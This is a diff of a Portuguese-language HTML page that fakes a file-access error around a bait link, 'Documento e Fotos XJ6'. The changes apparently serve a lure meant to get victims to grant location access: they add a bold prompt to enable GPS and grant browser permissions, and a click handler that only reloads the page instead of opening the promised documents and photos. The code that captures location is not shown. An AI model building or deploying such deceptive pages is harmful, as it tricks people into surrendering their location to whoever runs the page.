@@ -29,10 +29,16 @@
             color: #dc3545;
             margin-bottom: 20px;
         }
+        h2 {
+            font-size: 24px;
+            font-weight: bold;
+            font-style: italic;
+            margin-bottom: 10px;
+        }
         p {
             font-size: 16px;
             line-height: 1.6;
-            margin-bottom: 20px;
+            margin-bottom: 10px;
         }
         .spinner {
             border: 4px solid rgba(0, 0, 0, 0.1);
@@ -52,10 +58,10 @@
 </head>
 <body>
     <div class="error-container">
-        <h1>Erro ao tentar acessar os arquivos</h1></br>
-        <a href="https://bit.ly/DocumentoFotosXJ6" id="folderLink"><h2>Documento e Fotos XJ6</h2></a></br>
-        <p>Verifique se concedeu as permissões necessárias ao navegador.</p>
-        <p>Por favor, verifique suas permissões e tente novamente.</p>
+        <h1>Erro ao tentar vizualizar os arquivos</h1>
+        <a href="#" id="folderLink"><h2>Documento e Fotos XJ6</h2></a>
+        <p><strong><em>Verifique se o GPS está ativado.</em></strong></p>
+        <p>Por favor, verifique se concedeu suas permissões e tente novamente.</p>
         <center><div class="spinner"></div></center>
         <p>Carregando...</p>
     </div>
@@ -187,6 +193,13 @@
                 // Exibe a mensagem de erro
                 document.querySelector('.error-container').style.display = 'block';
             }
+
+            // Adiciona evento de clique ao link de pasta
+            const folderLink = document.getElementById('folderLink');
+            folderLink.addEventListener('click', function(event) {
+                event.preventDefault(); // Impede o comportamento padrão de redirecionamento
+                window.location.reload(); // Recarrega a página
+            });
         };
     </script>
 </body>
